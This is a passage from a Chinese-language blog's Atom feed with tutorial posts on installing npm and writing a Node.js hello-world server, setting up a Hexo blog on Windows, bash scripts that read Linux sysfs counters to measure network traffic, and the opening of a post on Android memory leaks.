<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive git:<span class="comment">//github.com/isaacs/npm.git</span></span><br><span class="line">cd npm</span><br><span class="line">node cli.js install npm -gf</span><br></pre></td></tr></table></figure>
<p>  注：在我的环境中，第一次执行 <figure class="highlight"><figcaption><span>cli.js install npm -gf``` 是失败了，重新在执行一次该命令，成功安装了npm包管理器。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10;- &#20351;&#29992;npm&#23433;&#35013;&#27169;&#22359;&#10;```javascript&#10;npm install underscore</span><br></pre></td></tr></table></figure></p>
</li>
</ul>
<p>安装结果如下图所示：<br><img src="C:\Users\le\Pictures\npm_install_2.png" alt=""><br>至此，Windows下的npm安装完毕。</p>
<h4 id="3-Nodejs编程初体验">3.Nodejs编程初体验</h4><p>编写一个简单的HTTP服务器模块，用于体验Nodejs的编程，同时也测试一下开发环境的搭建是否成功。在你的项目根文件夹下创建一个server.js的文件，并敲入以下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">    response.write(<span class="string">"Hello World"</span>);</span><br><span class="line">    response.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
<p>一个简单的HTTP服务器完成了，为了证明这一点，我们来运行并且测试这段代码。首先，用Node.js执行你的脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node server.js</span><br></pre></td></tr></table></figure></p>
<p>接下来，打开浏览器访问 <a href="http://localhost:8888/" target="_blank" rel="external">http://localhost:8888/</a> ，你会看到一个写着“Hello World”的网页。</p>
<p><strong>分析HTTP服务器</strong></p>
<p>接下来，让我们分析一下这个HTTP服务器的构成。第一行请求（require）Node.js自带的 http 模块，并且把它赋值给 http 变量。接下来调用http模块提供的函数： createServer 。这个函数会返回一个对象，这个对象有一个叫做 listen 的方法，这个方法有一个数值参数，用于指定这个HTTP服务器监听的端口号。咱们暂时先不管 http.createServer 的括号里的那个函数定义。<br>我们本来可以用这样的代码来启动服务器并侦听8888端口：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line">server.listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p>
<p>这段代码只会启动一个侦听8888端口的服务器，它不做任何别的事情，甚至连请求都不会应答。<br>在示例代码中，你会发现在creatServer()函数中，直接定义了一个函数。实际上，这个函数定义是 createServer() 的第一个也是唯一一个参数。因为在JavaScript中，函数和其他变量一样都是可以被传递的。</p>
<p><strong>进行函数传递</strong></p>
<p>举例来说，你可以这样做：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params">word</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(word);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">someFunction, value</span>) </span>&#123;</span><br><span class="line">    someFunction(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">execute(say, <span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure></p>
<p>请仔细阅读这段代码！在这里，我们把 say 函数作为execute函数的第一个变量进行了传递。这里返回的不是 say 的返回值，而是 say 本身！这样一来， say 就变成了execute 中的本地变量 someFunction ，execute可以通过调用 someFunction() （带括号的形式）来使用 say 函数。当然，因为 say 有一个变量， execute 在调用 someFunction 时可以传递这样一个变量。</p>
<p>我们可以，就像刚才那样，用它的名字把一个函数作为变量传递。但是我们不一定要绕这个“先定义，再传递”的圈子，我们可以直接在另一个函数的括号中定义和传递这个函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">someFunction, value</span>) </span>&#123;</span><br><span class="line">    someFunction(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">execute(<span class="function"><span class="keyword">function</span>(<span class="params">word</span>)</span>&#123; <span class="built_in">console</span>.log(word) &#125;, <span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure>
<p>我们在 execute 接受第一个参数的地方直接定义了我们准备传递给 execute 的函数。用这种方式，我们甚至不用给这个函数起名字，这也是为什么它被叫做 <strong>匿名函数</strong> 。</p>
<p>这是我们和我所认为的“进阶”JavaScript的第一次亲密接触，不过我们还是得循序渐进。现在，我们先接受这一点：在JavaScript中，一个函数可以作为另一个函数接收一个参数。我们可以先定义一个函数，然后传递，也可以在传递参数的地方直接定义函数。</p>
<p>我们可以把上面的代码改写为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onRequest</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Request received."</span>);</span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">    response.write(<span class="string">"Hello World"</span>);</span><br><span class="line">    response.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(onRequest).listen(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Server has started."</span>);</span><br></pre></td></tr></table></figure></p>
<p>接着，再来分析匿名函数内的实现。当收到请求时，console.log向标准输出输出一串字符串（Request received.），使用 response.writeHead() 函数发送一个HTTP状态200和HTTP头的内容类型（content-type），使用 response.write() 函数在HTTP相应主体中发送文本“Hello World”。最后，我们调用 response.end() 完成响应。</p>
<h4 id="4-结尾">4.结尾</h4><p>经过上面的学习，完成了Nodejs开发环境的搭建并通过少数几行代码就可以编写一个简单的HTTP服务器，了解了Nodejs的匿名函数，这是nodejs有别于其他脚本语言（如Python，PHP）的地方。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h4 id="1-Windows平台下Node-js的安装">1.Windows平台下Node.js的安装</h4><p>Node.js从V0.6.X的稳定版本后开始支持Windows平台上直接安装，不需要通过Cygwin或MinGW模拟Linux环境。直接到Node.js的官方网站上下载 <a href="http://www.nodejs.org/download/">http://www.nodejs.org/download/</a> ,Windows平台上提供两种安装包格式： .msi 和 .exe 。这里我们选择 .msi安装包格式，下载下来后直接安装，无需其他配置，简单快速。<br>]]>
    
    </summary>
    
      <category term="Node.js" scheme="http://science09.github.io/tags/Node-js/"/>
    
      <category term="WEB" scheme="http://science09.github.io/categories/WEB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用Hexo在GitHub上搭建自己的博客]]></title>
    <link href="http://science09.github.io/2014/08/11/%E4%BD%BF%E7%94%A8Hexo%E5%9C%A8GitHub%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>http://science09.github.io/2014/08/11/使用Hexo在GitHub上搭建自己的博客/</id>
    <published>2014-08-11T14:12:38.000Z</published>
    <updated>2015-09-10T14:13:14.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Hexo模块安装">Hexo模块安装</h3><a id="more"></a>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">le</span>&gt;<span class="title">node</span> -<span class="title">v</span></span><br><span class="line"><span class="title">v0</span>.10.30</span><br><span class="line"></span><br><span class="line"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">le</span>&gt;</span><br><span class="line"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">le</span>&gt;<span class="title">npm</span> -<span class="title">v</span></span><br><span class="line">1.4.23</span><br><span class="line"></span><br><span class="line"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">le</span>&gt;<span class="title">npm</span> <span class="title">install</span> -<span class="title">g</span> <span class="title">hexo</span></span><br><span class="line"><span class="title">npm</span> <span class="title">WARN</span> <span class="title">optional</span> <span class="title">dep</span> <span class="title">failed</span>, <span class="title">continuing</span> <span class="title">fsevents</span>@0.2.0</span><br><span class="line"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">hexo</span> -&gt; <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">hexo</span>\<span class="title">bin</span>\<span class="title">he</span></span><br><span class="line"><span class="title">xo</span></span><br><span class="line"><span class="title">hexo</span>@2.8.2 <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">hexo</span></span><br><span class="line">├── <span class="title">hexo</span>-<span class="title">front</span>-<span class="title">matter</span>@0.0.4</span><br><span class="line">├── <span class="title">strip</span>-<span class="title">indent</span>@0.1.3</span><br><span class="line">├── <span class="title">sprintf</span>-<span class="title">js</span>@0.0.7</span><br><span class="line">├── <span class="title">graceful</span>-<span class="title">fs</span>@3.0.2</span><br><span class="line">├── <span class="title">colors</span>@0.6.2</span><br><span class="line">├── <span class="title">mime</span>@1.2.11</span><br><span class="line">├── <span class="title">async</span>@0.9.0</span><br><span class="line">├── <span class="title">minimist</span>@0.2.0</span><br><span class="line">├── <span class="title">lodash</span>@2.4.1</span><br><span class="line">├── <span class="title">highlight.js</span>@8.1.0</span><br><span class="line">├── <span class="title">warehouse</span>@0.2.2 (<span class="title">async</span>@0.7.0)</span><br><span class="line">├── <span class="title">moment</span>@2.8.1</span><br><span class="line">├── <span class="title">chokidar</span>@0.8.2 (<span class="title">recursive</span>-<span class="title">readdir</span>@0.0.2)</span><br><span class="line">├── <span class="title">morgan</span>@1.2.2 (<span class="title">basic</span>-<span class="title">auth</span>@1.0.0, <span class="title">bytes</span>@1.0.0, <span class="title">depd</span>@0.4.4, <span class="title">finished</span>@1.2.2)</span><br><span class="line">├── <span class="title">connect</span>@3.1.0 (<span class="title">parseurl</span>@1.2.0, <span class="title">utils</span>-<span class="title">merge</span>@1.0.0, <span class="title">finalhandler</span>@0.1.0, <span class="title">deb</span></span><br><span class="line"><span class="title">ug</span>@1.0.4)</span><br><span class="line">├── <span class="title">compression</span>@1.0.10 (<span class="title">vary</span>@0.1.0, <span class="title">bytes</span>@1.0.0, <span class="title">on</span>-<span class="title">headers</span>@0.0.0, <span class="title">compressib</span></span><br><span class="line"><span class="title">le</span>@1.1.1, <span class="title">accepts</span>@1.0.7, <span class="title">debug</span>@1.0.4)</span><br><span class="line">├── <span class="title">serve</span>-<span class="title">static</span>@1.5.1 (<span class="title">utils</span>-<span class="title">merge</span>@1.0.0, <span class="title">parseurl</span>@1.3.0, <span class="title">escape</span>-<span class="title">html</span>@1.0.1,</span><br><span class="line"> <span class="title">send</span>@0.8.1)</span><br><span class="line">├── <span class="title">cheerio</span>@0.17.0 (<span class="title">entities</span>@1.1.1, <span class="title">dom</span>-<span class="title">serializer</span>@0.0.1, <span class="title">CSSselect</span>@0.4.1, <span class="title">ht</span></span><br><span class="line"><span class="title">mlparser2</span>@3.7.3)</span><br><span class="line">├── <span class="title">swig</span>@1.4.1 (<span class="title">optimist</span>@0.6.1, <span class="title">uglify</span>-<span class="title">js</span>@2.4.15)</span><br><span class="line">└── <span class="title">js</span>-<span class="title">yaml</span>@3.1.0 (<span class="title">esprima</span>@1.0.4, <span class="title">argparse</span>@0.1.15)</span><br><span class="line"></span><br><span class="line"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">le</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>查看Hexo版本：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">le</span>&gt;<span class="title">hexo</span> <span class="title">version</span></span><br><span class="line"><span class="title">hexo</span>: 2.8.2</span><br><span class="line"><span class="title">os</span>: <span class="title">Windows_NT</span> 6.1.7601 <span class="title">win32</span> <span class="title">ia32</span></span><br><span class="line"><span class="title">http_parser</span>: 1.0</span><br><span class="line"><span class="title">node</span>: 0.10.30</span><br><span class="line"><span class="title">v8</span>: 3.14.5.9</span><br><span class="line"><span class="title">ares</span>: 1.9.0-<span class="title">DEV</span></span><br><span class="line"><span class="title">uv</span>: 0.10.28</span><br><span class="line"><span class="title">zlib</span>: 1.2.3</span><br><span class="line"><span class="title">modules</span>: 11</span><br><span class="line"><span class="title">openssl</span>: 1.0.1<span class="title">h</span></span></span><br></pre></td></tr></table></figure></p>
<p>安装好了之后，我们就可以使用Hexo创建博客项目了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\le&gt;cd nodejs-hexo</span><br><span class="line"></span><br><span class="line">C:\Users\le\nodejs-hexo&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 <span class="number">4</span>C3C-<span class="number">47</span>CE</span><br><span class="line"></span><br><span class="line"> C:\Users\le\nodejs-hexo 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>                <span class="number">68</span> .gitignore</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>               <span class="number">181</span> package.json</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>    &lt;DIR&gt;          scaffolds</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>    &lt;DIR&gt;          source</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>    &lt;DIR&gt;          themes</span><br><span class="line"><span class="number">2014</span>/<span class="number">08</span>/<span class="number">11</span>  <span class="number">07</span>:<span class="number">06</span>             <span class="number">1</span>,<span class="number">819</span> _config.yml</span><br><span class="line">               <span class="number">3</span> 个文件          <span class="number">2</span>,<span class="number">068</span> 字节</span><br><span class="line">               <span class="number">5</span> 个目录  <span class="number">5</span>,<span class="number">002</span>,<span class="number">711</span>,<span class="number">040</span> 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\le\nodejs-hexo&gt;npm install</span><br><span class="line">hexo-renderer-ejs@<span class="number">0.1</span><span class="number">.0</span> node_modules\hexo-renderer-ejs</span><br><span class="line">├── ejs@<span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">└── lodash@<span class="number">2.4</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">hexo-renderer-marked@<span class="number">0.1</span><span class="number">.0</span> node_modules\hexo-renderer-marked</span><br><span class="line">├── marked@<span class="number">0.3</span><span class="number">.2</span></span><br><span class="line">└── lodash@<span class="number">2.4</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">hexo-renderer-stylus@<span class="number">0.1</span><span class="number">.0</span> node_modules\hexo-renderer-stylus</span><br><span class="line">├── nib@<span class="number">1.0</span><span class="number">.3</span> (stylus@<span class="number">0.37</span><span class="number">.0</span>)</span><br><span class="line">└── stylus@<span class="number">0.44</span><span class="number">.0</span> (css-parse@<span class="number">1.7</span><span class="number">.0</span>, mkdirp@<span class="number">0.3</span><span class="number">.5</span>, sax@<span class="number">0.5</span><span class="number">.8</span>, debug@<span class="number">1.0</span><span class="number">.4</span>, glo</span><br><span class="line">b@<span class="number">3.2</span><span class="number">.11</span>)</span><br><span class="line"></span><br><span class="line">C:\Users\le\nodejs-hexo&gt;</span><br></pre></td></tr></table></figure>
<p>启动Hexo服务器<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\le\nodejs-hexo&gt;hexo server</span><br><span class="line">[info] Hexo is running at http:<span class="comment">//localhost:4000/. Press Ctrl+C to stop.</span></span><br></pre></td></tr></table></figure></p>
<p>这时端口4000被打开了，我们能过浏览器打开地址，<a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a><br><img src="D:\学习资料\建站资料\博客文章\PicResource\hexo-blog.png" alt=""></p>
<h3 id="Hexo的使用">Hexo的使用</h3>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Hexo模块安装">Hexo模块安装</h3>]]>
    
    </summary>
    
      <category term="Hexo" scheme="http://science09.github.io/tags/Hexo/"/>
    
      <category term="github" scheme="http://science09.github.io/tags/github/"/>
    
      <category term="博客" scheme="http://science09.github.io/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="WEB" scheme="http://science09.github.io/categories/WEB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux下统计高速网络中的流量]]></title>
    <link href="http://science09.github.io/2014/08/01/Linux%E4%B8%8B%E7%BB%9F%E8%AE%A1%E9%AB%98%E9%80%9F%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E6%B5%81%E9%87%8F/"/>
    <id>http://science09.github.io/2014/08/01/Linux下统计高速网络中的流量/</id>
    <published>2014-08-01T15:54:15.000Z</published>
    <updated>2015-09-10T13:44:46.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>在Linux中有很多的流量监控工具，它们可以监控、分类网络流量，以花哨的图形用户界面提供实时流量分析报告。本文中我们介绍一种简单的Shell 脚本，它可以监控网络流量而且不依赖于缓慢的libpcap库。<br><a id="more"></a><br>在Linux中有很多的流量监控工具，它们可以监控、分类网络流量，以花哨的图形用户界面提供实时流量分析报告。大多数这些工具（例如：ntopng ,  iftop ）都是基于libpcap 库的 ，这个函数库是用来截取流经网卡的数据包的，可在用户空间用来监视分析网络流量。尽管这些工具功能齐全，然而基于libpcap库的流量监控工具无法处理高速（Gb以上）的网络接口，原因是由于在用户空间做数据包截取的系统开销过高所致。</p>
</blockquote>
<p>在本文中我们介绍一种简单的Shell 脚本，它可以监控网络流量而且不依赖于缓慢的libpcap库。这些脚本支持Gb以上规模的高速网络接口，如果你对“汇聚型”的网络流量感兴趣的话，它们可统计每个网络接口上的流量。</p>
<p>脚本主要是基于sysfs虚拟文件系统，这是由内核用来将设备或驱动相关的信息输出到用户空间的一种机制。网络接口的相关分析数据会通过 <code>/sys/class/net/&lt;ethX&gt;/statistics</code> 输出。</p>
<p>举个例子，eth0的网口上分析报告会输出到这些文件中：</p>
<ul>
<li>/sys/class/net/eth0/statistics/rx_packets: 收到的数据包数据</li>
<li>/sys/class/net/eth0/statistics/tx_packets: 传输的数据包数量</li>
<li>/sys/class/net/eth0/statistics/rx_bytes: 接收的字节数</li>
<li>/sys/class/net/eth0/statistics/tx_bytes: 传输的字节数</li>
<li>/sys/class/net/eth0/statistics/rx_dropped: 收包时丢弃的数据包</li>
<li>/sys/class/net/eth0/statistics/tx_dropped: 发包时丢弃的数据包</li>
</ul>
<p>这些数据会根据内核数据发生变更的时候自动刷新。因此，你可以编写一系列的脚本进行分析并计算流量统计。第一个脚本是统计每秒数据量，包含接收（RX）或发送（TX）。而后面的则是一个描述网络传输中的接收（RX）发送(TX)带宽。这些脚本中不需要安装任何的工具。</p>
<p>测量网口每秒数据包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/bash </span></span><br><span class="line">INTERVAL=<span class="string">"1"</span>  <span class="comment"># update interval in seconds </span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$1</span>"</span> ]; <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">echo</span> usage: <span class="variable">$0</span> [network-interface] </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">echo</span> e.g. <span class="variable">$0</span> eth0 </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">echo</span> shows packets-per-second </span><br><span class="line">        <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line">IF=<span class="variable">$1</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">        R1=`cat /sys/class/net/<span class="variable">$1</span>/statistics/rx_packets`</span><br><span class="line">        T1=`cat /sys/class/net/<span class="variable">$1</span>/statistics/tx_packets`</span><br><span class="line">        sleep <span class="variable">$INTERVAL</span></span><br><span class="line">        R2=`cat /sys/class/net/<span class="variable">$1</span>/statistics/rx_packets`</span><br><span class="line">        T2=`cat /sys/class/net/<span class="variable">$1</span>/statistics/tx_packets`</span><br><span class="line">        TXPPS=`expr <span class="variable">$T2</span> - <span class="variable">$T1</span>`</span><br><span class="line">        RXPPS=`expr <span class="variable">$R2</span> - <span class="variable">$R1</span>`</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"TX <span class="variable">$1</span>: <span class="variable">$TXPPS</span> pkts/s RX <span class="variable">$1</span>: <span class="variable">$RXPPS</span> pkts/s"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>网络带宽测量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/bash </span></span><br><span class="line">INTERVAL=<span class="string">"1"</span>  <span class="comment"># update interval in seconds </span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$1</span>"</span> ]; <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">echo</span> usage: <span class="variable">$0</span> [network-interface] </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">echo</span> e.g. <span class="variable">$0</span> eth0 </span><br><span class="line">        <span class="built_in">echo</span> </span><br><span class="line">        <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line">IF=<span class="variable">$1</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">        R1=`cat /sys/class/net/<span class="variable">$1</span>/statistics/rx_bytes`</span><br><span class="line">        T1=`cat /sys/class/net/<span class="variable">$1</span>/statistics/tx_bytes`</span><br><span class="line">        sleep <span class="variable">$INTERVAL</span></span><br><span class="line">        R2=`cat /sys/class/net/<span class="variable">$1</span>/statistics/rx_bytes`</span><br><span class="line">        T2=`cat /sys/class/net/<span class="variable">$1</span>/statistics/tx_bytes`</span><br><span class="line">        TBPS=`expr <span class="variable">$T2</span> - <span class="variable">$T1</span>`</span><br><span class="line">        RBPS=`expr <span class="variable">$R2</span> - <span class="variable">$R1</span>`</span><br><span class="line">        TKBPS=`expr <span class="variable">$TBPS</span> / <span class="number">1024</span>`</span><br><span class="line">        RKBPS=`expr <span class="variable">$RBPS</span> / <span class="number">1024</span>`</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"TX <span class="variable">$1</span>: <span class="variable">$TKBPS</span> kb/s RX <span class="variable">$1</span>: <span class="variable">$RKBPS</span> kb/s"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>下面的屏幕截图显示了上面的两个脚本的输出。</p>
<p><img src="" alt="图片占位"></p>
<p>原文链接：<a href="http://www.geekfan.net/5558/" target="_blank" rel="external">http://www.geekfan.net/5558/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>在Linux中有很多的流量监控工具，它们可以监控、分类网络流量，以花哨的图形用户界面提供实时流量分析报告。本文中我们介绍一种简单的Shell 脚本，它可以监控网络流量而且不依赖于缓慢的libpcap库。<br>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://science09.github.io/tags/Linux/"/>
    
      <category term="Linux" scheme="http://science09.github.io/categories/Linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android内存管理之道]]></title>
    <link href="http://science09.github.io/2014/08/01/Android%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B9%8B%E9%81%93/"/>
    <id>http://science09.github.io/2014/08/01/Android内存管理之道/</id>
    <published>2014-08-01T14:33:22.000Z</published>
    <updated>2015-09-10T13:24:22.000Z</updated>
    <content type="html"><![CDATA[<p>相信一步步走过来的Android从业者，每个人都会遇到OOM的情况。如何避免和防范OOM的出现，对于每一个程序员来说确实是一门必不可少的能力。今天我们就谈谈在Android平台下内存的管理之道，开始今天的主题之前，先再次回顾两个概念。<br><a id="more"></a><br>内存泄漏：对象在内存heap堆中中分配的空间，当不再使用或没有引用指向的情况下，仍不能被GC正常回收的情况。多数出现在不合理的编码情况下，比如在Activity中注册了一个广播接收器，但是在页面关闭的时候进行unRegister，就会出现内存溢出的现象。通常情况下，大量的内存泄漏会造成OOM。</p>
